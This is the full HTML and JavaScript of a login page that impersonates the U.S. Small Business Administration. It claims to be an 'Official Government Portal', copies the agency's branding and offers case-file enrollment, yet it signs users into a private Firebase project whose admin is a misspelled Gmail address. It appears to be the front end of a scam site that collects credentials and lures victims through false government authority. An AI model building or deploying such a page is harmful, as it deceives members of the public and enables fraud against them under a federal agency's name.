<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA | Authorized Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
        body { background: #f1f4f8; font-family: 'Public Sans', -apple-system, sans-serif; -webkit-font-smoothing: antialiased; }
        
        /* Perfect Mobile Scaling */
        .login-card { width: 92%; max-width: 400px; background: #ffffff; border-radius: 2px; border-top: 6px solid var(--sba-navy); box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
        
        /* The Real SBA Logo Style */
        .sba-brand-box { border: 2.5px solid var(--sba-navy); padding: 3px 6px; display: inline-block; position: relative; }
        .sba-brand-box::after { content: ""; position: absolute; bottom: -2.5px; left: -2.5px; width: 60%; height: 2.5px; background: var(--sba-red); }
        
        /* Pro Inputs */
        input { height: 50px !important; border: 1.5px solid #e2e8f0 !important; border-radius: 2px !important; transition: 0.2s; font-size: 16px !important; }
        input:focus { border-color: var(--sba-navy) !important; box-shadow: 0 0 0 3px rgba(0, 46, 109, 0.1) !important; outline: none; }
        
        .btn-federal { background: var(--sba-navy); height: 55px; font-weight: 800; letter-spacing: 1px; border-radius: 2px; transition: 0.3s; text-transform: uppercase; color: white; }
        .btn-federal:hover { background: #001f4d; transform: translateY(-1px); box-shadow: 0 5px 15px rgba(0, 46, 109, 0.2); }
        
        .google-auth { border: 1px solid #d1d5db; height: 50px; font-weight: 700; border-radius: 2px; background: #fff; transition: 0.2s; }
        .google-auth:hover { background: #f9fafb; }
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="bg-[#f8f9fa] border-b border-gray-200 py-2 px-5 flex items-center gap-3">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="USA">
        <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Official Government Portal</span>
    </div>

    <main class="flex-grow flex items-center justify-center p-4">
        <div class="login-card p-8">
            <div class="flex items-center gap-3 mb-10">
                <div class="sba-brand-box">
                    <span class="text-2xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
                </div>
                <div class="h-10 w-[1.5px] bg-gray-200"></div>
                <div class="leading-none">
                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-tight">U.S. Small Business</p>
                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-tight">Administration</p>
                </div>
            </div>

            <div class="mb-8">
                <h2 class="text-2xl font-black text-slate-800 tracking-tight">LOGIN</h2>
                <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-1">Personnel Authentication Required</p>
            </div>

            <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic"></div>

            <form id="loginForm" class="space-y-5">
                <button type="button" id="googleBtn" class="google-auth w-full flex items-center justify-center gap-3">
                    <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" class="w-5">
                    <span class="text-[12px] uppercase text-gray-600">Sign in with Google</span>
                </button>

                <div class="relative flex py-2 items-center">
                    <div class="flex-grow border-t border-gray-100"></div>
                    <span class="flex-shrink mx-3 text-[9px] font-black text-gray-300 uppercase tracking-widest">OR USE CREDENTIALS</span>
                    <div class="flex-grow border-t border-gray-100"></div>
                </div>

                <div>
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Official Email</label>
                    <input type="email" id="userEmail" required class="w-full px-4" placeholder="officer@sba.gov">
                </div>

                <div>
                    <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Secure Passkey</label>
                    <div class="relative flex items-center">
                        <input type="password" id="userPass" required class="w-full px-4 pr-12" placeholder="••••••••">
                        <i id="eyeIcon" class="fas fa-eye absolute right-4 text-gray-300 cursor-pointer text-sm" onclick="togglePass()"></i>
                    </div>
                </div>

                <div class="flex items-center justify-between text-[10px] font-black text-slate-400 uppercase tracking-widest">
                    <label class="flex items-center gap-2 cursor-pointer">
                        <input type="checkbox" class="accent-[#002e6d] w-3 h-3"> Remember Device
                    </label>
                    <a href="forget-password.html" class="text-blue-700 hover:text-red-600">Reset Access</a>
                </div>

                <button type="submit" id="submitBtn" class="btn-federal w-full shadow-lg mt-2">
                    Authorize & Enter
                </button>
            </form>

            <div class="mt-10 pt-8 border-t border-gray-50 text-center">
                <a href="register.html" class="text-[#002e6d] font-black text-[11px] uppercase tracking-[0.2em] hover:text-red-600 transition-all">Enroll New Case File <i class="fas fa-chevron-right ml-1"></i></a>
            </div>
        </div>
    </main>

    <footer class="py-10 text-center">
        <p class="text-[9px] text-gray-400 font-black uppercase tracking-[0.4em]">
            <i class="fas fa-shield-alt mr-2"></i> Authorized Node: SBA-SYSTEM-V15
        </p>
    </footer>

    <script type="module">
        import { auth } from './firebase-config.js';
        import { signInWithEmailAndPassword, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";

        const ADMIN_EMAIL = "sba.suppor@gmail.com";
        const loginForm = document.getElementById('loginForm');
        const alertBox = document.getElementById('alertBox');
        const btn = document.getElementById('submitBtn');

        window.togglePass = () => {
            const p = document.getElementById('userPass');
            const i = document.getElementById('eyeIcon');
            p.type = p.type === "password" ? "text" : "password";
            i.className = p.type === "password" ? "fas fa-eye" : "fas fa-eye-slash";
        };

        const go = (email) => {
            window.location.href = (email === ADMIN_EMAIL) ? "admin-portal.html" : "welcome.html";
        };

        loginForm.onsubmit = async (e) => {
            e.preventDefault();
            alertBox.classList.add('hidden');
            const email = document.getElementById('userEmail').value.toLowerCase().trim();
            const pass = document.getElementById('userPass').value;

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';

            try {
                const r = await signInWithEmailAndPassword(auth, email, pass);
                go(r.user.email);
            } catch (err) {
                btn.disabled = false;
                btn.innerText = "Authorize & Enter";
                alertBox.innerText = "Error: Invalid Security Credentials";
                alertBox.classList.remove('hidden');
            }
        };

        document.getElementById('googleBtn').onclick = async () => {
            try {
                const r = await signInWithPopup(auth, new GoogleAuthProvider());
                go(r.user.email);
            } catch (err) { console.error(err); }
        };
    </script>
</body>
</html>
